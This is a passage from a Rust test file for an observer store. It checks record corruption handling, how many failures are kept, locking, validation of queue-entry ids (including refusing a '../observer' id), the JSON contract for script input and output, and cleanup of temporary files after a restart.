    let mut raw: serde_json::Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    raw["active_run"] = json!(3);
    fs::write(&path, serde_json::to_vec(&raw).unwrap()).unwrap();

    assert_eq!(store.load(&record.observer_id).unwrap().active_run, None);
}

#[test]
fn errors_are_kept_newest_first_up_to_the_limit() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let lock = store.lock(&record.observer_id).unwrap();
    let written = KEPT_RUN_FAILURES as u64 + 5;

    for sequence in 1..=written {
        store
            .record_failure(&lock, &failure(&record, sequence))
            .unwrap();
    }

    let kept = store.list_failures(&record.observer_id).unwrap();
    assert_eq!(kept.len(), KEPT_RUN_FAILURES);
    assert_eq!(kept[0], failure(&record, written));
    assert_eq!(kept.last().unwrap().sequence, 6);
    assert!(!root
        .paths()
        .observer_error_file(record.observer_id.as_str(), 5)
        .exists());
    // The same run's error again replaces it.
    let mut again = failure(&record, written);
    again.status = RunStatus::Lost;
    store.record_failure(&lock, &again).unwrap();
    let kept = store.list_failures(&record.observer_id).unwrap();
    assert_eq!(kept.len(), KEPT_RUN_FAILURES);
    assert_eq!(kept[0].status, RunStatus::Lost);
}

#[test]
fn an_error_needs_the_observers_own_lock() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "a");
    let other = create_jira(&store, "b");
    let lock = store.lock(&other.observer_id).unwrap();

    assert!(matches!(
        store.record_failure(&lock, &failure(&record, 1)),
        Err(ObserverError::LockMismatch { .. })
    ));
    assert!(store.list_failures(&record.observer_id).unwrap().is_empty());
}

#[test]
fn the_lenient_listing_skips_unreadable_records_and_the_strict_one_refuses_them() {
    // D7.
    let root = TempRoot::new();
    let store = root.store();
    let corrupt = create_jira(&store, "corrupt");
    let newer = create_jira(&store, "newer");
    let healthy = create_jira(&store, "healthy");
    fs::write(
        root.paths()
            .observer_record_file(corrupt.observer_id.as_str()),
        b"{ not json",
    )
    .unwrap();
    let path = root
        .paths()
        .observer_record_file(newer.observer_id.as_str());
    let mut raw: serde_json::Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    raw["record_version"] = json!(OBSERVER_RECORD_VERSION + 1);
    fs::write(&path, serde_json::to_vec(&raw).unwrap()).unwrap();

    assert_eq!(store.list_readable().unwrap(), vec![healthy]);
    assert!(store.list().is_err());
}

// ---------------------------------------------------------------------------
// Queue entries
// ---------------------------------------------------------------------------

#[test]
fn a_queue_entry_exists_once_per_task_and_episode() {
    // KTD-4, AE3, R17: the same episode reported again keeps its entry; a
    // new episode of the same gate is a new entry.
    let root = TempRoot::new();
    let store = root.store();
    let lock = store.lock_queue_entries().unwrap();

    let first = entry(owner(), "mr-review", "task-1", "input-1");
    assert_eq!(
        first.entry_id,
        queue_entry_id(&TaskId::parse("task-1").unwrap(), "input-1")
    );
    assert_eq!(
        store.add_queue_entry(&lock, &first).unwrap(),
        EntryWrite::Created
    );
    let mut again = entry(owner(), "mr-review", "task-1", "input-1");
    again.created_at = now() + Duration::seconds(60);
    assert_eq!(again.entry_id, first.entry_id);
    assert_eq!(
        store.add_queue_entry(&lock, &again).unwrap(),
        EntryWrite::Exists(first.clone())
    );
    let mut next = entry(owner(), "mr-review", "task-1", "input-2");
    next.created_at = now() + Duration::seconds(120);
    assert_ne!(next.entry_id, first.entry_id);
    assert_eq!(
        store.add_queue_entry(&lock, &next).unwrap(),
        EntryWrite::Created
    );

    assert_eq!(
        store.queue_entries(&owner(), "mr-review").unwrap(),
        vec![first.clone(), next.clone()]
    );
    assert_eq!(
        store.queue_entry(&first.entry_id).unwrap(),
        Some(first.clone())
    );
    assert!(store.remove_queue_entry(&lock, &first.entry_id).unwrap());
    assert!(!store.remove_queue_entry(&lock, &first.entry_id).unwrap());
    assert!(store.remove_queue_entry(&lock, "../observer").is_err());
    assert_eq!(store.queue_entry(&first.entry_id).unwrap(), None);
    assert_eq!(store.queue_entry("../observer").unwrap(), None);
    assert_eq!(store.list_queue_entries().unwrap(), vec![next]);
}

#[test]
fn a_queue_entry_keeps_the_gates_params_choices_and_variables() {
    let root = TempRoot::new();
    let store = root.store();
    let lock = store.lock_queue_entries().unwrap();
    let added = entry(owner(), "mr-review", "task-1", "input-1");
    store.add_queue_entry(&lock, &added).unwrap();

    let raw: serde_json::Value =
        serde_json::from_slice(&fs::read(root.paths().queue_entry_file(&added.entry_id)).unwrap())
            .unwrap();

    assert_eq!(raw["owner"], "owner");
    assert_eq!(raw["queue"], "mr-review");
    assert_eq!(raw["task_id"], "task-1");
    assert_eq!(raw["episode"], "input-1");
    assert_eq!(raw["step"], "review_work");
    assert_eq!(raw["params"]["label"], "w CR");
    assert_eq!(raw["choices"][1]["requires_variables"], json!(["note"]));
    assert_eq!(raw["variables"][0]["type"], "text");
    assert_eq!(store.queue_entry(&added.entry_id).unwrap(), Some(added));
}

#[test]
fn a_queue_entry_with_a_forged_id_or_a_bad_queue_is_refused() {
    let root = TempRoot::new();
    let store = root.store();
    let lock = store.lock_queue_entries().unwrap();

    let mut forged = entry(owner(), "mr-review", "task-1", "input-1");
    forged.entry_id = "0".repeat(64);
    assert!(store.add_queue_entry(&lock, &forged).is_err());
    let bad_queue = entry(owner(), "no spaces allowed", "task-1", "input-1");
    assert!(store.add_queue_entry(&lock, &bad_queue).is_err());
    let no_episode = entry(owner(), "mr-review", "task-1", "");
    assert!(store.add_queue_entry(&lock, &no_episode).is_err());
    assert!(store.list_queue_entries().unwrap().is_empty());
}

#[test]
fn only_the_newest_error_of_an_entry_is_kept() {
    // R23.
    let root = TempRoot::new();
    let store = root.store();
    let record = create(&store, owner(), review_config("gitlab-mr", "mr-review"));
    let lock = store.lock(&record.observer_id).unwrap();
    let with_entry = |sequence, entry_id: &str| RunFailure {
        entry_id: Some(entry_id.to_string()),
        ..failure(&record, sequence)
    };

    store.record_failure(&lock, &with_entry(1, "a")).unwrap();
    store.record_failure(&lock, &with_entry(2, "b")).unwrap();
    store.record_failure(&lock, &failure(&record, 3)).unwrap();
    store.record_failure(&lock, &with_entry(4, "a")).unwrap();

    let kept: Vec<(u64, Option<String>)> = store
        .list_failures(&record.observer_id)
        .unwrap()
        .into_iter()
        .map(|failure| (failure.sequence, failure.entry_id))
        .collect();
    assert_eq!(
        kept,
        vec![
            (4, Some("a".to_string())),
            (3, None),
            (2, Some("b".to_string()))
        ]
    );
}

#[test]
fn the_run_of_an_entry_names_its_task_and_episode() {
    let root = TempRoot::new();
    let store = root.store();
    let mut record = create(&store, owner(), review_config("gitlab-mr", "mr-review"));
    let lock = store.lock(&record.observer_id).unwrap();
    let checked = entry(owner(), "mr-review", "task-1", "input-1");
    let mut run = active_run(1);
    run.entry = Some(RunEntry {
        entry_id: checked.entry_id.clone(),
        task_id: checked.task_id.clone(),
        episode: checked.episode.clone(),
    });
    record.active_run = Some(run.clone());
    record.entry_round = vec![checked.entry_id.clone()];

    store.save(&lock, &mut record, now()).unwrap();

    let loaded = store.load(&record.observer_id).unwrap();
    assert_eq!(loaded.active_run, Some(run));
    assert_eq!(loaded.entry_round, vec![checked.entry_id]);
}

// ---------------------------------------------------------------------------
// The script contract
// ---------------------------------------------------------------------------

#[test]
fn script_output_over_the_limit_or_not_json_breaks_the_contract() {
    let oversized = format!(r#"{{"state": "{}"}}"#, "x".repeat(MAX_SCRIPT_OUTPUT_BYTES));
    assert!(matches!(
        parse_script_output(oversized.as_bytes()),
        Err(ContractError::TooLarge { .. })
    ));
    assert!(matches!(
        parse_script_output(b"found 3 issues"),
        Err(ContractError::Malformed(_))
    ));
    assert!(matches!(
        parse_script_output(br#"{"state": {"cursor": 5}} {"state": {}}"#),
        Err(ContractError::Malformed(_))
    ));

    assert!(matches!(
        parse_script_output(
            br#"{"state": {}, "closed_watches": ["https://gitlab.example.com/a/-/merge_requests/17"]}"#
        ),
        Err(ContractError::Malformed(_))
    ));

    let output = parse_script_output(br#"{"state": {"cursor": 5}}"#).unwrap();
    assert_eq!(output.state, json!({"cursor": 5}));
}

#[test]
fn the_script_input_is_one_json_document_with_the_queue_entry() {
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let input = script_input(&record);

    let value: serde_json::Value = serde_json::from_slice(&input.to_json_bytes()).unwrap();

    // R11: version 2 carries the entry with its episode's start and the
    // gate's choices and variables.
    assert_eq!(value["contract_version"], json!(2));
    assert_eq!(value["observer"]["name"], json!("jira-abc"));
    assert!(value["observer"].get("source").is_none());
    assert_eq!(value["state"], json!({"cursor": 4}));
    assert_eq!(
        value["entry"],
        json!({
            "task_id": "task-1",
            "episode": "input-1",
            "episode_started_at": now(),
            "step": "review_work",
            "params": {"mr_url": "https://gitlab/1"},
            "choices": [
                {"name": "check_feedback", "description": "Read the feedback", "requires_variables": []},
                {"name": "revise_plan", "description": null, "requires_variables": ["note"]},
            ],
            "variables": [
                {"name": "note", "type": "text", "description": "What to change"},
                {"name": "severity", "type": "select", "description": null, "options": ["low", "high"]},
            ],
        })
    );
    assert_eq!(value["first_run"], json!(true));
    let read: ScriptInput = serde_json::from_value(value).unwrap();
    assert_eq!(read, input);
}

#[test]
fn the_script_input_of_an_always_run_has_no_entry_field() {
    // R25: an `always` run checks no entry.
    let root = TempRoot::new();
    let store = root.store();
    let record = create_jira(&store, "jira-abc");
    let mut input = script_input(&record);
    input.entry = None;

    let value: serde_json::Value = serde_json::from_slice(&input.to_json_bytes()).unwrap();

    assert_eq!(value["contract_version"], json!(2));
    assert!(value.get("entry").is_none(), "{value}");
}

// ---------------------------------------------------------------------------
// Restart
// ---------------------------------------------------------------------------

#[test]
fn records_scripts_errors_and_entries_survive_a_restart() {
    let root = TempRoot::new();
    let (jira, review, error, entry) = {
        let store = root.store();
        let jira = create_jira(&store, "jira-abc");
        store
            .add_script(&jira.observer_id, "echo one\n", now())
            .unwrap();
        let review = store
            .create(
                owner(),
                review_config("gitlab-review", "mr-review"),
                None,
                now(),
            )
            .unwrap();
        let lock = store.lock(&jira.observer_id).unwrap();
        let mut active = store.load(&jira.observer_id).unwrap();
        active.active_run = Some(active_run(2));
        store.save(&lock, &mut active, now()).unwrap();
        let error = failure(&jira, 1);
        store.record_failure(&lock, &error).unwrap();
        drop(lock);
        let lock = store.lock_queue_entries().unwrap();
        let entry = self::entry(owner(), "mr-review", "task-1", "input-1");
        store.add_queue_entry(&lock, &entry).unwrap();
        let jira = store.load(&jira.observer_id).unwrap();
        (jira, review, error, entry)
    };
    // Interrupted writes leave temporary files; a fresh store sweeps them.
    let stray = temp_path_for(&root.paths().observer_record_file(jira.observer_id.as_str()));
    fs::write(&stray, b"{").unwrap();
    let stray_entry = temp_path_for(&root.paths().queue_entry_file(&entry.entry_id));
    fs::write(&stray_entry, b"{").unwrap();

    let store = root.store();

    assert_eq!(
        store.cleanup_orphaned_temp_files().unwrap(),
        vec![stray, stray_entry]
    );
    assert_eq!(store.list().unwrap(), vec![review.clone(), jira.clone()]);
    assert_eq!(
        store.load_script(&jira.observer_id, 1).unwrap(),
        "echo one\n"
    );
    assert_eq!(store.list_failures(&jira.observer_id).unwrap(), vec![error]);
    assert_eq!(jira.active_run, Some(active_run(2)));
    assert_eq!(
        store.queue_entries(&owner(), "mr-review").unwrap(),
        vec![entry]
    );
}

#[test]
fn a_directory_without_a_record_is_not_an_observer() {
    let root = TempRoot::new();
    let store = root.store();
    let dir: &Path = &root.paths().observer_dir("obs-orphan");
    fs::create_dir_all(dir.join("scripts")).unwrap();
    fs::write(root.paths().observers_dir().join("stray.txt"), b"x").unwrap();

    assert!(store.list().unwrap().is_empty());
    let orphan = narsor_engine::observers::ObserverId::parse("obs-orphan").unwrap();
    assert!(matches!(
        store.lock(&orphan),
        Err(ObserverError::NotFound(_))
    ));
}
